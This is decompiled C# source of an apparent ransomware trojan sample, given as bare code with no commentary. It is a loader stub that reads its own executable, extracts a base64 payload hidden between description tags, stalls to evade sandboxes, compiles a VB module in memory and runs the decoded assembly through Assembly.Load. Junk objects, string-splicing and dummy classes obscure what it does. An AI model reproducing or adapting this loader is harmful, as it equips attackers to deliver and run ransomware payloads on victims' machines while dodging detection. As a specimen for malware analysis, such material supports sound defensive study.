// Decompiled with JetBrains decompiler
// Type: fede.tekno
// Assembly: fede, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4FF3E6D1-8F87-4C9E-B066-84BBB83AFD37
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00050-msil\Trojan-Ransom.Win32.Blocker.azae-67e855e8b8ca2bcc705b26235f7f53911f61c0f4.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace fede
{
  [StandardModule]
  internal sealed class tekno
  {
    public static object jjo()
    {
      CheckBox checkBox = new CheckBox();
      Thread.Sleep(10);
      CompilerParameters compilerParameters = new CompilerParameters();
      Thread.Sleep(10);
      compilerParameters.GenerateInMemory = true;
      compilerParameters.CompilerOptions = "/optimize+ /platform:x86 /target:library";
      compilerParameters.ReferencedAssemblies.AddRange(new string[6]
      {
        "System.dll",
        "System.Data.dll",
        "System.Deployment.dll",
        "System.Drawing.dll",
        "System.Windows.Forms.dll",
        "System.Xml.dll"
      });
      StringBuilder stringBuilder = new StringBuilder();
      TextBox textBox1 = new TextBox();
      TextBox textBox2 = new TextBox();
      stringBuilder.Append("\r\nImports System, Microsoft.VisualBasic, System.Reflection, System.Diagnostics");
      TextBox textBox3 = new TextBox();
      stringBuilder.Append("\r\nModule Yo");
      TextBox textBox4 = new TextBox();
      stringBuilder.Append("\r\nSub Main()");
      TextBox textBox5 = new TextBox();
      stringBuilder.Append("\r\n        Dim t As New Stopwatch");
      TextBox textBox6 = new TextBox();
      stringBuilder.Append("\r\n");
      TextBox textBox7 = new TextBox();
      stringBuilder.Append("\r\n        Do Until t.ElapsedMilliseconds >= 20000");
      TextBox textBox8 = new TextBox();
      stringBuilder.Append("\r\n           t.Start()");
      stringBuilder.Append("\r\n           System.Threading.Thread.Sleep(1)");
      stringBuilder.Append("\r\n          ");
      stringBuilder.Append("\r\n        Loop");
      stringBuilder.Append("\r\n        t.Stop()");
      stringBuilder.Append("\r\nEnd Sub");
      stringBuilder.Append("\r\nPublic function hard(byval s as Object) As Byte");
      stringBuilder.Append("\r\nreturn Assembly.Load(convert.frombase64string(s)).Entrypoint.Invoke(nothing,nothing)");
      stringBuilder.Append("\r\nend function");
      stringBuilder.Append("\r\nEnd module");
      ArrayList arrayList = new ArrayList();
      arrayList.Add((object) compilerParameters);
      arrayList.Add((object) stringBuilder.ToString());
      return (object) CodeDomProvider.CreateProvider("zB".Replace("z", "V")).CompileAssemblyFromSource((CompilerParameters) arrayList[0], Conversions.ToString(arrayList[1])).CompiledAssembly.GetType("Yo").GetMethod("hard");
    }

    [STAThread]
    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void Main()
    {
      CheckBox checkBox = new CheckBox();
      string str1 = "";
      string str2 = "<descri-".Replace("-", "ption>");
      string str3 = "</descr-".Replace("-", "iption>");
      FileSystem.FileOpen(1, Process.GetCurrentProcess().MainModule.FileName, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
      string str4 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      FileSystem.FileGet(1, ref str4);
      FileSystem.FileClose(1);
      string str5 = str4;
      for (int startIndex = checked (str5.IndexOf(str2) + str2.Length); startIndex != checked (str2.Length - 1); startIndex = checked (str5.IndexOf(str2, startIndex) + str2.Length))
        str1 = str5.Substring(startIndex, checked (str5.IndexOf(str3, startIndex) - startIndex));
      object obj = (object) new string[1]{ str1 };
      Stopwatch stopwatch = new Stopwatch();
      while (stopwatch.ElapsedMilliseconds < 5000L)
      {
        stopwatch.Start();
        Thread.Sleep(10);
      }
      stopwatch.Stop();
      object Instance = tekno.jjo();
      object[] objArray = new object[2]
      {
        RuntimeHelpers.GetObjectValue(tekno.jjo()),
        RuntimeHelpers.GetObjectValue(obj)
      };
      object[] Arguments = objArray;
      bool[] flagArray = new bool[2]{ false, true };
      bool[] CopyBack = flagArray;
      NewLateBinding.LateCall(Instance, (System.Type) null, "Invoke", Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
      if (!flagArray[1])
        return;
      RuntimeHelpers.GetObjectValue(objArray[1]);
    }

    public class keeeeetch
    {
      [DebuggerNonUserCode]
      public keeeeetch()
      {
      }

      public static object jgddyrs()
      {
        tekno.keeeeetch.nhsrkvhkvv();
        object obj;
        return obj;
      }

      public static object hdjttjdjd()
      {
        tekno.keeeeetch.jgddyrs();
        object obj;
        return obj;
      }

      public static object nhsrkvhkvv()
      {
        tekno.asjeageagegaegea.bfdfbbdb();
        object obj;
        return obj;
      }
    }

    public class asjeageagegaegea
    {
      [DebuggerNonUserCode]
      public asjeageagegaegea()
      {
      }

      public static object bfdfbbdb()
      {
        tekno.jjo();
        object obj;
        return obj;
      }
    }
  }
}
